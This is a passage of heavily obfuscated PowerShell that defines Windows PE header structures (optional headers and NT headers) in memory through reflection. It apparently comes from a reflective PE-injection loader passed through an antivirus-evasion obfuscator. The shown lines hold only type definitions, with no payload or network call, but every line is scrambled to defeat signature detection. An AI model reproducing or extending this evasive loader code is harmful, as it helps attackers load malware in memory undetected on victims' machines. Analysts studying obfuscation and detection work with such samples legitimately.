		    (${typE`BuILd`eR}.("{2}{0}{1}{3}"-f'ef','ineFiel','D','d').Invoke(("{4}{1}{5}{6}{0}{2}{3}"-f'si','norSu','o','n','Mi','bs','ystemVer'), [UInt16], ("{2}{0}{1}" -f 'ubl','ic','P'))).("{2}{0}{1}{3}"-f 't','Offs','Se','et').Invoke(50) | &("{0}{2}{1}"-f 'Out-N','ll','u')
		    (${tYpE`BuI`L`deR}.("{0}{2}{1}"-f'Def','Field','ine').Invoke(("{1}{0}{3}{2}" -f'32V','Win','e','ersionValu'), [UInt32], ("{0}{1}"-f'Publ','ic'))).("{1}{2}{0}"-f 'et','Set','Offs').Invoke(52) | &("{0}{1}" -f'Ou','t-Null')
		    (${Ty`p`ebUiL`Der}.("{0}{1}{2}"-f 'Defi','neF','ield').Invoke(("{2}{1}{0}{3}"-f 'Im','Of','Size','age'), [UInt32], ("{1}{0}" -f 'ic','Publ'))).("{1}{2}{0}"-f 'ffset','S','etO').Invoke(56) | &("{1}{0}" -f'll','Out-Nu')
		    (${TypeBU`i`LDEr}.("{2}{1}{0}"-f'eld','i','DefineF').Invoke(("{0}{3}{1}{4}{2}"-f 'Size','f','ers','O','Head'), [UInt32], ("{1}{0}"-f 'lic','Pub'))).("{1}{0}{2}"-f'f','SetOf','set').Invoke(60) | &("{1}{0}{2}" -f 't-N','Ou','ull')
		    (${tY`PeB`UIlDER}.("{2}{0}{1}{3}" -f 'fineF','iel','De','d').Invoke(("{1}{0}{2}" -f 'kS','Chec','um'), [UInt32], ("{0}{2}{1}"-f 'P','c','ubli'))).("{1}{0}" -f 't','SetOffse').Invoke(64) | &("{2}{1}{0}" -f 'll','u','Out-N')
		    (${T`YPE`Bui`LdEr}.("{0}{2}{1}" -f 'Def','ield','ineF').Invoke(("{0}{2}{1}"-f'Sub','stem','sy'), ${Su`BsY`sTE`MTYPe}, ("{1}{0}" -f'lic','Pub'))).("{0}{1}{2}{3}" -f 'S','e','tOff','set').Invoke(68) | &("{0}{1}"-f 'Out','-Null')
		    (${tY`PEbu`i`LDeR}.("{2}{3}{1}{0}"-f 'd','iel','Def','ineF').Invoke(("{0}{1}{2}{3}"-f'Dl','lCharac','teristi','cs'), ${dLLc`hAraC`TeRiSTic`ST`yPE}, ("{1}{0}"-f 'blic','Pu'))).("{0}{3}{2}{1}"-f 'Set','set','f','Of').Invoke(70) | &("{0}{2}{1}" -f'Out','ll','-Nu')
		    (${typE`BUI`L`der}.("{1}{3}{0}{2}"-f'i','Defi','eld','neF').Invoke(("{2}{0}{1}{3}" -f 'StackRe','ser','SizeOf','ve'), [UInt64], ("{1}{0}" -f 'ublic','P'))).("{0}{1}{2}{3}" -f'S','et','O','ffset').Invoke(72) | &("{0}{2}{1}"-f'Out-','ll','Nu')
		    (${typE`BU`ILd`ER}.("{0}{1}{2}" -f'DefineFi','el','d').Invoke(("{1}{2}{3}{0}"-f 'kCommit','SizeOfS','t','ac'), [UInt64], ("{0}{1}"-f 'Pub','lic'))).("{2}{0}{1}"-f'Offse','t','Set').Invoke(80) | &("{1}{0}" -f'll','Out-Nu')
		    (${TYpEB`UI`Ld`eR}.("{2}{0}{1}"-f 'f','ineField','De').Invoke(("{2}{0}{1}{3}"-f'HeapRe','s','SizeOf','erve'), [UInt64], ("{1}{0}"-f 'blic','Pu'))).("{0}{1}{2}"-f 'S','etOffs','et').Invoke(88) | &("{1}{0}{2}"-f'-Nu','Out','ll')
		    (${ty`Peb`Ui`lDEr}.("{1}{0}{2}{3}" -f'e','Defin','F','ield').Invoke(("{0}{1}{3}{2}"-f 'SizeO','f','t','HeapCommi'), [UInt64], ("{0}{1}{2}" -f 'P','ubl','ic'))).("{1}{2}{3}{0}" -f 'fset','Se','t','Of').Invoke(96) | &("{0}{1}{2}" -f 'O','ut-Nul','l')
		    (${T`y`PEBuIlDer}.("{0}{3}{1}{2}"-f 'De','ine','Field','f').Invoke(("{2}{1}{3}{0}"-f 's','aderF','Lo','lag'), [UInt32], ("{1}{0}"-f'blic','Pu'))).("{0}{1}{2}" -f 'Se','tOff','set').Invoke(104) | &("{0}{1}" -f'Out-Nul','l')
		    (${T`y`P`EBuILdEr}.("{0}{1}{2}{3}"-f'De','fi','n','eField').Invoke(("{3}{2}{1}{0}"-f's','ndSize','RvaA','NumberOf'), [UInt32], ("{1}{0}" -f'blic','Pu'))).("{2}{0}{1}"-f 'tOf','fset','Se').Invoke(108) | &("{2}{1}{0}"-f'Null','ut-','O')
		    (${T`yPeBUI`lDER}.("{3}{2}{0}{1}"-f'F','ield','efine','D').Invoke(("{2}{0}{1}{3}"-f'tT','abl','Expor','e'), ${imag`e`_da`T`A_dIreCT`ORy}, ("{1}{2}{0}" -f 'ic','Pu','bl'))).("{0}{2}{1}" -f 'S','ffset','etO').Invoke(112) | &("{2}{0}{1}" -f'ut-Nu','ll','O')
		    (${T`ype`BuiLd`er}.("{2}{0}{1}{3}" -f'n','e','Defi','Field').Invoke(("{2}{0}{1}"-f'b','le','ImportTa'), ${iMAGe_`DaTA_`DIrE`cT`ORy}, ("{0}{1}" -f'Pu','blic'))).("{0}{2}{1}"-f 'Set','fset','Of').Invoke(120) | &("{0}{2}{1}"-f 'Out','ull','-N')
		    (${TyPEbU`il`D`Er}.("{2}{3}{0}{1}" -f'Fiel','d','Def','ine').Invoke(("{2}{0}{1}"-f 'urceTabl','e','Reso'), ${ImAgE_Da`Ta_D`iReCto`RY}, ("{0}{1}" -f 'P','ublic'))).("{2}{0}{1}" -f 'f','set','SetOf').Invoke(128) | &("{1}{2}{0}" -f 'ull','Out-','N')
		    (${TyPeB`U`ILdEr}.("{0}{1}{2}"-f 'Define','Fi','eld').Invoke(("{2}{4}{1}{0}{3}"-f'tionT','ep','E','able','xc'), ${ImAG`E_`DaTA`_`d`IrEctoRy}, ("{1}{0}"-f'lic','Pub'))).("{0}{1}{2}" -f'S','etOf','fset').Invoke(136) | &("{1}{2}{0}"-f'll','O','ut-Nu')
		    (${Ty`pe`Bui`lder}.("{3}{2}{0}{1}"-f 'l','d','Fie','Define').Invoke(("{0}{1}{2}{3}" -f'C','ert','ificateTab','le'), ${iMa`gE_`d`ATA_DiR`eC`TO`Ry}, ("{2}{0}{1}"-f'ubl','ic','P'))).("{0}{3}{2}{1}" -f'S','set','tOff','e').Invoke(144) | &("{0}{1}{2}"-f'O','ut-N','ull')
		    (${tYp`eBuiL`deR}.("{1}{0}{2}" -f'ineF','Def','ield').Invoke(("{1}{2}{3}{0}"-f'ble','BaseReloc','at','ionTa'), ${i`M`AgE_DATA_dI`ReCT`ORY}, ("{1}{0}" -f'blic','Pu'))).("{0}{2}{1}"-f'Set','set','Off').Invoke(152) | &("{0}{2}{1}"-f'O','t-Null','u')
		    (${T`ypEb`UildeR}.("{2}{3}{0}{1}"-f'Fie','ld','Defi','ne').Invoke(("{1}{0}"-f'g','Debu'), ${im`A`GE_data_D`I`REC`TOrY}, ("{0}{2}{1}"-f 'P','ic','ubl'))).("{1}{2}{3}{0}"-f 'et','S','etOf','fs').Invoke(160) | &("{0}{1}" -f 'Out-Nul','l')
		    (${t`ypeBUIlD`er}.("{2}{1}{0}" -f 'd','fineFiel','De').Invoke(("{1}{0}{3}{2}" -f'ch','Ar','tecture','i'), ${imaG`e_DA`T`A_DI`RecT`orY}, ("{1}{0}{2}"-f 'u','P','blic'))).("{0}{2}{1}"-f 'SetOff','et','s').Invoke(168) | &("{1}{0}{2}"-f'Nul','Out-','l')
		    (${t`YPeb`UiLDEr}.("{0}{1}{2}{3}"-f 'D','efineF','iel','d').Invoke(("{2}{1}{0}" -f 'alPtr','ob','Gl'), ${I`magE_`dA`TA_DirEctorY}, ("{0}{1}" -f'Publi','c'))).("{1}{2}{0}"-f'set','SetO','ff').Invoke(176) | &("{2}{1}{0}"-f 'll','ut-Nu','O')
		    (${TypEB`U`iL`DER}.("{0}{1}{2}{3}" -f 'Defi','neF','iel','d').Invoke(("{2}{1}{0}"-f 'STable','L','T'), ${iM`Age_`dAt`A_`di`ReCtO`RY}, ("{1}{0}"-f 'lic','Pub'))).("{2}{1}{0}"-f 'et','ffs','SetO').Invoke(184) | &("{2}{0}{1}" -f'-N','ull','Out')
		    (${TYPebU`I`LDeR}.("{0}{2}{1}" -f'Defin','ield','eF').Invoke(("{2}{0}{3}{1}" -f 'a','nfigTable','Lo','dCo'), ${Im`Ag`e_DAt`A_dI`RECT`O`RY}, ("{2}{0}{1}" -f'i','c','Publ'))).("{2}{0}{1}" -f 'etOffs','et','S').Invoke(192) | &("{0}{1}" -f'O','ut-Null')
		    (${T`yPeB`UILDer}.("{0}{2}{1}{3}" -f 'Def','F','ine','ield').Invoke(("{0}{1}{3}{2}"-f 'Boun','dI','rt','mpo'), ${IM`A`g`E_`dAta_DiRE`Cto`Ry}, ("{1}{0}" -f 'lic','Pub'))).("{0}{2}{1}"-f'SetOf','et','fs').Invoke(200) | &("{1}{2}{0}"-f 'Null','Out','-')
		    (${Typ`eBu`Il`deR}.("{1}{2}{0}{3}"-f 'f','D','e','ineField').Invoke('IAT', ${I`M`AG`E_d`ATa_dIrE`ctoRY}, ("{0}{1}{2}" -f'Pub','li','c'))).("{0}{1}{2}" -f 'Se','tOffs','et').Invoke(208) | &("{2}{1}{0}"-f'Null','t-','Ou')
		    (${TY`p`EBUild`er}.("{2}{0}{1}" -f'efineFi','eld','D').Invoke(("{3}{1}{0}{2}" -f'escripto','elayImportD','r','D'), ${iM`AGE_data_`DirE`cTO`Ry}, ("{0}{1}" -f 'Publi','c'))).("{1}{0}{2}" -f 'tOffs','Se','et').Invoke(216) | &("{0}{1}"-f'O','ut-Null')
		    (${Ty`p`ebU`ildER}.("{0}{2}{1}" -f'D','ld','efineFie').Invoke(("{1}{3}{2}{0}" -f 'r','CL','untimeHeade','RR'), ${Ima`Ge`_DaT`A_DirecT`oRy}, ("{0}{1}"-f'P','ublic'))).("{1}{2}{0}" -f'et','SetOff','s').Invoke(224) | &("{1}{0}"-f '-Null','Out')
		    (${t`yp`eBUilD`ER}.("{0}{1}{2}{3}" -f 'Define','Fi','e','ld').Invoke(("{1}{0}" -f 'ved','Reser'), ${I`ma`gE`_`DaTa_diR`e`cTORY}, ("{2}{1}{0}" -f'c','bli','Pu'))).("{1}{0}"-f 'fset','SetOf').Invoke(232) | &("{1}{0}"-f 'ut-Null','O')
		    ${Im`AgE_O`pT`I`ONa`L_H`Ea`DER64} = ${Ty`Pebui`ld`eR}.("{0}{1}{2}"-f'Cre','ateTy','pe').Invoke()
		    ${WIN3`2`T`yPEs} | &("{0}{1}{2}"-f 'Add-','M','ember') -MemberType ("{2}{1}{0}" -f'y','ePropert','Not') -Name ("{0}{4}{2}{1}{3}" -f'IMAGE_OPTIONAL','DER','HEA','64','_') -Value ${IMag`e_Opt`IOnAl_`HeADEr`64}

		    
		    ${a`Tt`Ribut`eS} = ("{4}{0}{6}{12}{2}{3}{1}{8}{5}{9}{10}{7}{11}"-f't, AnsiClass,','Lay','plici','t','AutoLayou','Before',' C','ldI','out, Sealed, ','Fi','e','nit','lass, Public, Ex')
		    ${TYpE`BuilD`er} = ${moDUL`E`BU`ilD`eR}.("{0}{1}{2}"-f 'De','fineTyp','e').Invoke(("{3}{1}{5}{4}{2}{0}"-f 'ER32','_O','AD','IMAGE','HE','PTIONAL_'), ${aT`T`RiBu`TeS}, [System.ValueType], 224)
		    (${ty`pEBUi`LDer}.("{0}{1}{2}" -f'Define','Fi','eld').Invoke(("{1}{0}"-f'gic','Ma'), ${MagIC`TY`pE}, ("{0}{1}{2}" -f 'Pu','bl','ic'))).("{1}{0}{2}{3}" -f 'tO','Se','ffs','et').Invoke(0) | &("{0}{2}{1}" -f 'O','ull','ut-N')
		    (${T`Y`PEb`UildEr}.("{1}{0}{2}"-f'eFiel','Defin','d').Invoke(("{4}{0}{1}{2}{3}"-f'a','j','or','LinkerVersion','M'), [Byte], ("{0}{1}" -f 'P','ublic'))).("{2}{1}{0}" -f 't','se','SetOff').Invoke(2) | &("{0}{1}" -f 'Out-N','ull')
		    (${Typ`ebui`lD`er}.("{2}{0}{1}"-f 'fineFie','ld','De').Invoke(("{2}{0}{5}{3}{1}{4}"-f'inorLink','ersi','M','V','on','er'), [Byte], ("{0}{1}"-f'Pub','lic'))).("{0}{2}{3}{1}"-f 'Se','t','tOf','fse').Invoke(3) | &("{0}{1}" -f 'Out-N','ull')
		    (${TY`Pe`BUIL`DER}.("{2}{0}{1}{3}" -f'i','el','DefineF','d').Invoke(("{1}{0}{2}"-f 'Cod','SizeOf','e'), [UInt32], ("{0}{1}{2}"-f 'Publ','i','c'))).("{2}{1}{0}{3}" -f'se','f','SetOf','t').Invoke(4) | &("{0}{1}"-f'Out-Nu','ll')
		    (${T`Yp`Ebu`ildeR}.("{2}{0}{1}{3}" -f 'efin','eFi','D','eld').Invoke(("{4}{2}{0}{3}{1}" -f 'ize','ata','zeOfInitial','dD','Si'), [UInt32], ("{1}{0}"-f 'ublic','P'))).("{0}{1}"-f'Se','tOffset').Invoke(8) | &("{0}{1}"-f'O','ut-Null')
		    (${T`yP`eB`UIlDEr}.("{2}{1}{0}{3}" -f 'Fi','efine','D','eld').Invoke(("{3}{1}{0}{2}"-f'i','t','alizedData','SizeOfUnini'), [UInt32], ("{2}{0}{1}"-f'ubli','c','P'))).("{0}{2}{1}" -f'Set','et','Offs').Invoke(12) | &("{1}{0}{2}" -f'Nu','Out-','ll')
		    (${Ty`PE`BU`iLDeR}.("{1}{0}{2}"-f'ine','Def','Field').Invoke(("{3}{1}{2}{0}"-f'int','n','tryPo','AddressOfE'), [UInt32], ("{0}{1}" -f 'Publ','ic'))).("{0}{2}{1}" -f'SetO','t','ffse').Invoke(16) | &("{1}{0}{2}"-f 't-','Ou','Null')
		    (${Ty`p`E`BUilDEr}.("{3}{1}{0}{2}" -f'l','ineFie','d','Def').Invoke(("{3}{0}{2}{1}" -f 'Of','de','Co','Base'), [UInt32], ("{0}{1}" -f 'Pub','lic'))).("{0}{1}{2}"-f'S','e','tOffset').Invoke(20) | &("{1}{2}{0}" -f 'ull','Out-','N')
		    (${T`Y`P`EBUildER}.("{2}{1}{3}{0}"-f 'ld','F','Define','ie').Invoke(("{1}{0}{2}" -f'O','Base','fData'), [UInt32], ("{0}{1}" -f 'P','ublic'))).("{0}{1}{2}" -f'SetO','f','fset').Invoke(24) | &("{0}{1}{2}" -f 'Out','-N','ull')
		    (${t`Y`pebuiLDER}.("{3}{2}{0}{1}" -f'eF','ield','in','Def').Invoke(("{1}{2}{0}" -f 'e','ImageB','as'), [UInt32], ("{2}{1}{0}"-f 'lic','b','Pu'))).("{2}{1}{0}"-f 't','ffse','SetO').Invoke(28) | &("{2}{1}{0}" -f'l','Nul','Out-')
		    (${t`y`PEbuiLd`eR}.("{1}{3}{2}{0}"-f 'eld','Def','neFi','i').Invoke(("{3}{0}{1}{2}{4}"-f'ec','tio','nAl','S','ignment'), [UInt32], ("{1}{0}"-f 'ublic','P'))).("{1}{0}{2}" -f 'tOff','Se','set').Invoke(32) | &("{1}{0}"-f'll','Out-Nu')
		    (${TYPEB`UI`L`DEr}.("{1}{0}{2}"-f 'neFi','Defi','eld').Invoke(("{3}{2}{4}{1}{0}"-f 'ent','Alignm','il','F','e'), [UInt32], ("{1}{2}{0}" -f'c','Pub','li'))).("{1}{2}{0}"-f 'fset','Set','Of').Invoke(36) | &("{1}{0}{2}"-f'ul','Out-N','l')
		    (${T`YpEbuiL`D`Er}.("{1}{0}{3}{2}"-f'i','DefineF','ld','e').Invoke(("{4}{3}{5}{2}{6}{7}{1}{0}" -f 'ersion','emV','peratin','a','M','jorO','g','Syst'), [UInt16], ("{2}{0}{1}"-f 'b','lic','Pu'))).("{1}{0}{2}"-f 'e','SetOffs','t').Invoke(40) | &("{1}{2}{0}" -f 'l','Out-','Nul')
		    (${tYP`e`B`UiLDer}.("{0}{2}{3}{1}"-f'Def','ld','ine','Fie').Invoke(("{1}{5}{6}{4}{3}{0}{2}{7}"-f'Ve','M','rsi','tem','ngSys','in','orOperati','on'), [UInt16], ("{0}{1}" -f 'P','ublic'))).("{0}{1}{2}"-f 'Se','tOf','fset').Invoke(42) | &("{1}{0}{2}"-f 'u','Out-N','ll')
		    (${TyP`EbuIld`er}.("{1}{0}{2}"-f'e','D','fineField').Invoke(("{1}{2}{3}{0}"-f'ion','MajorIm','a','geVers'), [UInt16], ("{1}{0}" -f'lic','Pub'))).("{2}{1}{0}"-f'tOffset','e','S').Invoke(44) | &("{1}{0}{2}"-f't-Nul','Ou','l')
		    (${tYpEBui`L`DER}.("{0}{2}{1}" -f 'Define','eld','Fi').Invoke(("{5}{4}{3}{1}{2}{0}"-f'sion','mageV','er','orI','in','M'), [UInt16], ("{1}{0}" -f 'lic','Pub'))).("{0}{1}{2}"-f'SetO','ff','set').Invoke(46) | &("{1}{2}{0}" -f 'l','O','ut-Nul')
		    (${Typ`eB`Ui`LDeR}.("{1}{2}{3}{0}"-f 'Field','Def','i','ne').Invoke(("{4}{3}{2}{0}{6}{5}{1}" -f'e','ersion','bsyst','rSu','Majo','V','m'), [UInt16], ("{0}{1}"-f 'Pub','lic'))).("{0}{2}{1}" -f 'SetOffs','t','e').Invoke(48) | &("{2}{0}{1}"-f 'N','ull','Out-')
		    (${typ`EbuI`l`Der}.("{0}{1}{2}" -f'D','efine','Field').Invoke(("{1}{2}{3}{0}"-f 'Version','M','i','norSubsystem'), [UInt16], ("{0}{1}"-f 'Pub','lic'))).("{2}{0}{1}" -f'etOf','fset','S').Invoke(50) | &("{0}{1}{2}"-f 'Ou','t-N','ull')
		    (${TYpeB`U`IL`dEr}.("{1}{3}{2}{0}"-f'ld','Defi','ie','neF').Invoke(("{0}{2}{1}{3}"-f 'Win32Vers','Val','ion','ue'), [UInt32], ("{1}{2}{0}"-f 'lic','Pu','b'))).("{1}{3}{0}{2}"-f 'Offs','Se','et','t').Invoke(52) | &("{1}{2}{0}" -f 'Null','O','ut-')
		    (${t`y`PEBuILder}.("{2}{0}{1}" -f'n','eField','Defi').Invoke(("{0}{1}{2}" -f'SizeOf','Im','age'), [UInt32], ("{0}{1}" -f'Publ','ic'))).("{1}{2}{0}"-f'set','Set','Off').Invoke(56) | &("{2}{1}{0}"-f'Null','ut-','O')
		    (${t`yPEBUI`l`DER}.("{0}{2}{1}" -f'Define','ld','Fie').Invoke(("{2}{0}{1}"-f 'er','s','SizeOfHead'), [UInt32], ("{0}{1}" -f 'Publ','ic'))).("{2}{1}{0}" -f't','ffse','SetO').Invoke(60) | &("{0}{2}{1}"-f 'Ou','ll','t-Nu')
		    (${t`YpE`Bu`ILDEr}.("{2}{1}{0}"-f'ld','Fie','Define').Invoke(("{1}{2}{0}" -f 'um','C','heckS'), [UInt32], ("{0}{1}"-f 'P','ublic'))).("{0}{1}" -f 'SetOff','set').Invoke(64) | &("{1}{0}"-f 'l','Out-Nul')
		    (${T`YPe`B`UIldER}.("{1}{0}{2}"-f'efi','D','neField').Invoke(("{2}{1}{0}"-f 'm','yste','Subs'), ${Su`BS`ySTEMTY`Pe}, ("{0}{1}{2}" -f'P','ubl','ic'))).("{0}{1}{2}"-f'SetOff','s','et').Invoke(68) | &("{1}{0}{2}"-f'u','Out-N','ll')
		    (${t`Y`PEb`UILdEr}.("{2}{0}{1}"-f 'efine','Field','D').Invoke(("{3}{2}{0}{4}{1}"-f 'eris','ics','llCharact','D','t'), ${dLLchA`RAcTe`RiSTi`C`StYPE}, ("{0}{1}"-f'P','ublic'))).("{0}{1}" -f 'Se','tOffset').Invoke(70) | &("{2}{0}{1}" -f 'N','ull','Out-')
		    (${tYpEBu`iL`DEr}.("{2}{0}{1}"-f'efi','neField','D').Invoke(("{2}{0}{4}{1}{3}" -f 'eOfSt','er','Siz','ve','ackRes'), [UInt32], ("{0}{1}" -f 'Pu','blic'))).("{2}{1}{0}"-f'fset','etOf','S').Invoke(72) | &("{1}{0}{2}"-f 'ul','Out-N','l')
		    (${tyPE`BU`iL`DER}.("{2}{3}{1}{0}"-f'd','Fiel','Def','ine').Invoke(("{3}{0}{1}{4}{2}"-f 'ac','kComm','t','SizeOfSt','i'), [UInt32], ("{0}{1}"-f'Publi','c'))).("{1}{0}"-f'Offset','Set').Invoke(76) | &("{0}{1}{2}"-f'Ou','t-N','ull')
		    (${tYpe`BUi`Lder}.("{3}{2}{1}{0}" -f'd','el','fineFi','De').Invoke(("{3}{1}{2}{0}"-f 'serve','O','fHeapRe','Size'), [UInt32], ("{1}{2}{0}" -f 'c','Publ','i'))).("{0}{1}{2}"-f'Se','t','Offset').Invoke(80) | &("{1}{0}{2}"-f 't-N','Ou','ull')
		    (${tYp`EbUilD`er}.("{2}{3}{0}{1}"-f 'Fie','ld','Defin','e').Invoke(("{1}{3}{2}{0}"-f'mmit','SizeOf','eapCo','H'), [UInt32], ("{0}{1}"-f 'Pu','blic'))).("{0}{1}{2}" -f 'Se','tOff','set').Invoke(84) | &("{1}{0}" -f'ull','Out-N')
		    (${tYp`E`BuIlDEr}.("{2}{3}{0}{1}" -f'Fie','ld','Def','ine').Invoke(("{2}{1}{0}" -f 'gs','rFla','Loade'), [UInt32], ("{1}{0}"-f'lic','Pub'))).("{0}{2}{1}" -f 'S','ffset','etO').Invoke(88) | &("{0}{2}{1}" -f'Out','Null','-')
		    (${t`ypEbui`l`dER}.("{1}{2}{0}" -f 'ld','Def','ineFie').Invoke(("{4}{3}{5}{2}{0}{1}"-f'dSiz','es','fRvaAn','ber','Num','O'), [UInt32], ("{0}{1}" -f 'Publ','ic'))).("{0}{1}{2}" -f'Se','tOffse','t').Invoke(92) | &("{1}{2}{0}" -f 'l','Ou','t-Nul')
		    (${t`y`PE`BuIldeR}.("{1}{2}{0}" -f'ield','Def','ineF').Invoke(("{3}{2}{1}{0}" -f'le','ab','T','Export'), ${IMa`ge_DA`TA_`dir`e`CTo`RY}, ("{0}{1}" -f 'Pu','blic'))).("{0}{2}{1}"-f'Set','ffset','O').Invoke(96) | &("{2}{0}{1}"-f 't-N','ull','Ou')
		    (${typ`eBUI`lD`ER}.("{0}{1}{2}{3}" -f'Defi','neF','iel','d').Invoke(("{3}{2}{1}{0}" -f'able','T','t','Impor'), ${IMAge_`daT`A`_`dirECToRY}, ("{0}{1}{2}" -f 'P','ubli','c'))).("{1}{0}{2}"-f'Offs','Set','et').Invoke(104) | &("{1}{0}" -f'l','Out-Nul')
		    (${tyPeb`U`ilDEr}.("{1}{0}{2}" -f 'fine','De','Field').Invoke(("{3}{0}{1}{2}{4}" -f 'es','our','ceTab','R','le'), ${ImAg`e_`D`Ata_`DiReCtOrY}, ("{0}{1}"-f 'P','ublic'))).("{2}{1}{0}" -f'fset','etOf','S').Invoke(112) | &("{1}{0}{2}" -f't-','Ou','Null')
		    (${tYpeB`U`ILDER}.("{1}{3}{0}{2}"-f 'e','Defi','ld','neFi').Invoke(("{0}{2}{1}"-f'Exc','tionTable','ep'), ${i`mAg`e_`DatA_DIr`EcTOrY}, ("{1}{0}" -f 'ic','Publ'))).("{2}{1}{0}"-f'et','Offs','Set').Invoke(120) | &("{0}{1}" -f'Out','-Null')
		    (${tYpE`B`Uil`DEr}.("{2}{0}{1}"-f 'ineF','ield','Def').Invoke(("{0}{2}{3}{1}"-f'C','ficateTable','e','rti'), ${IM`AG`e_dATa`_dI`Recto`RY}, ("{1}{0}" -f'ublic','P'))).("{2}{1}{0}" -f'et','etOffs','S').Invoke(128) | &("{1}{0}"-f 'Null','Out-')
		    (${T`Y`PEbuI`ldeR}.("{2}{0}{1}" -f'ef','ineField','D').Invoke(("{4}{1}{0}{5}{3}{2}" -f'eRel','s','ble','nTa','Ba','ocatio'), ${IMag`e_dA`TA`_`DIR`eCT`orY}, ("{0}{1}" -f 'Publi','c'))).("{0}{2}{1}"-f 'S','set','etOff').Invoke(136) | &("{0}{1}{2}"-f 'Out-','N','ull')
		    (${t`y`PEBUilD`Er}.("{1}{2}{0}"-f 'Field','Def','ine').Invoke(("{0}{1}"-f 'Deb','ug'), ${IMAge_`Da`Ta_`DiRECtO`Ry}, ("{0}{1}" -f 'Pub','lic'))).("{0}{2}{1}"-f 'SetOf','et','fs').Invoke(144) | &("{1}{0}{2}"-f 'Nu','Out-','ll')
		    (${t`YPe`BuIl`deR}.("{2}{0}{1}" -f 'i','neField','Def').Invoke(("{2}{0}{3}{1}" -f 'c','tecture','Ar','hi'), ${Image_da`T`A`_di`REct`OrY}, ("{1}{0}" -f'c','Publi'))).("{0}{2}{1}"-f'S','Offset','et').Invoke(152) | &("{1}{0}{2}"-f'l','Out-Nu','l')
		    (${Typ`ebU`il`deR}.("{0}{2}{1}{3}" -f 'Def','neFie','i','ld').Invoke(("{1}{0}{3}{2}"-f 'loba','G','Ptr','l'), ${IMage_daT`A`_DI`Re`cTO`Ry}, ("{1}{0}"-f'ublic','P'))).("{0}{1}{2}" -f'Se','tOf','fset').Invoke(160) | &("{0}{2}{1}" -f 'O','l','ut-Nul')
		    (${typE`Bu`il`DeR}.("{2}{1}{0}"-f'eField','efin','D').Invoke(("{0}{1}{2}" -f'TLS','Tabl','e'), ${IM`Ag`e_Dat`A`_di`Rec`TOry}, ("{0}{2}{1}"-f'Pub','c','li'))).("{1}{2}{0}"-f'fset','Se','tOf').Invoke(168) | &("{0}{2}{1}"-f'Out-','ull','N')
		    (${t`YpEb`UIlDeR}.("{0}{1}{2}{3}" -f'De','fineFie','l','d').Invoke(("{2}{1}{0}" -f 'Table','onfig','LoadC'), ${iMAGe_da`T`A_D`I`ReCTo`RY}, ("{0}{1}{2}" -f 'P','ubli','c'))).("{2}{1}{0}"-f 't','ffse','SetO').Invoke(176) | &("{2}{0}{1}" -f'-','Null','Out')
		    (${TYPeBU`I`LdER}.("{0}{1}{3}{2}" -f 'Defi','n','ield','eF').Invoke(("{0}{2}{1}" -f'Boun','mport','dI'), ${i`M`A`gE_DAta_d`i`RECtORy}, ("{1}{0}" -f'blic','Pu'))).("{0}{1}{2}" -f 'SetO','ff','set').Invoke(184) | &("{0}{1}{2}"-f 'Out-Nu','l','l')
		    (${ty`peB`UilD`Er}.("{2}{1}{0}" -f 'neField','fi','De').Invoke('IAT', ${I`m`A`ge`_da`TA_directOrY}, ("{0}{2}{1}" -f 'P','ic','ubl'))).("{2}{1}{0}"-f't','tOffse','Se').Invoke(192) | &("{0}{2}{1}"-f'O','-Null','ut')
		    (${T`YPeBUI`l`dER}.("{0}{3}{1}{2}" -f 'D','eFie','ld','efin').Invoke(("{0}{1}{3}{2}{4}"-f 'D','ela','Descrip','yImport','tor'), ${iMage_DAta_`d`irEct`ory}, ("{0}{1}" -f'Pub','lic'))).("{0}{2}{1}{3}"-f'Set','fse','Of','t').Invoke(200) | &("{1}{0}{2}" -f't-Nul','Ou','l')
		    (${T`Ype`BuIlD`eR}.("{2}{0}{1}"-f'neFi','eld','Defi').Invoke(("{0}{2}{1}{3}"-f'CLRRu','t','n','imeHeader'), ${iM`Ag`E`_dA`T`A_DiREcToRY}, ("{0}{1}" -f'Pu','blic'))).("{1}{2}{0}"-f 't','Se','tOffse').Invoke(208) | &("{1}{0}" -f'l','Out-Nul')
		    (${tYp`ebU`ILDER}.("{2}{1}{3}{0}" -f'ld','e','D','fineFie').Invoke(("{0}{2}{1}" -f'Res','ved','er'), ${i`MaG`e_D`AtA_di`Rect`oRy}, ("{0}{1}" -f 'Pu','blic'))).("{0}{1}{2}"-f'SetO','ff','set').Invoke(216) | &("{0}{1}{2}" -f 'Out-N','ul','l')
		    ${image_opTIOnAL_He`AD`e`R`32} = ${ty`PE`BuilDeR}.("{2}{3}{0}{1}"-f 'teTyp','e','C','rea').Invoke()
		    ${w`in32t`Y`pes} | &("{0}{2}{1}"-f 'A','mber','dd-Me') -MemberType ("{0}{1}{2}" -f'NotePro','per','ty') -Name ("{3}{0}{6}{2}{1}{4}{5}" -f 'P','ONAL_H','I','IMAGE_O','EA','DER32','T') -Value ${im`AgE_opTIONAL_`HE`A`D`E`R32}

		    
		    ${att`Ri`BUtEs} = ("{9}{1}{7}{6}{4}{11}{8}{18}{3}{2}{0}{16}{15}{13}{10}{12}{19}{17}{5}{14}" -f 'ass, Publi','t','l',', C','t,','reFieldIn','u','oLayo','iC','Au','ntialLayou',' Ans','t, ','Seque','it',', ','c',', Befo','lass','Sealed')
		    ${Ty`PEBu`ilDEr} = ${ModUL`e`B`UIld`er}.("{1}{2}{0}"-f'Type','D','efine').Invoke(("{4}{0}{1}{2}{3}" -f'GE_N','T','_H','EADERS64','IMA'), ${a`TTR`Ib`Utes}, [System.ValueType], 264)
		    ${t`YpEb`UIldEr}.("{1}{3}{2}{0}" -f'neField','D','fi','e').Invoke(("{1}{2}{0}"-f're','Sig','natu'), [UInt32], ("{2}{0}{1}" -f 'bl','ic','Pu')) | &("{0}{1}" -f'Out-N','ull')
		    ${TyP`Eb`UIl`DER}.("{0}{1}{2}" -f 'De','fine','Field').Invoke(("{0}{2}{1}{3}" -f 'Fil','eade','eH','r'), ${ImAge_fil`E_`hE`A`DEr}, ("{1}{0}" -f 'lic','Pub')) | &("{1}{0}"-f 'ull','Out-N')
		    ${t`YPEBUild`ER}.("{2}{0}{1}" -f 'eFie','ld','Defin').Invoke(("{0}{1}{2}" -f'Opt','io','nalHeader'), ${IM`AGE_`op`T`io`Na`L_headeR64}, ("{1}{0}"-f 'lic','Pub')) | &("{0}{1}{2}"-f'Out-N','ul','l')
		    ${I`mAGe_Nt`_HEaDER`S64} = ${tYP`EBu`i`ldEr}.("{1}{0}{2}" -f 're','C','ateType').Invoke()
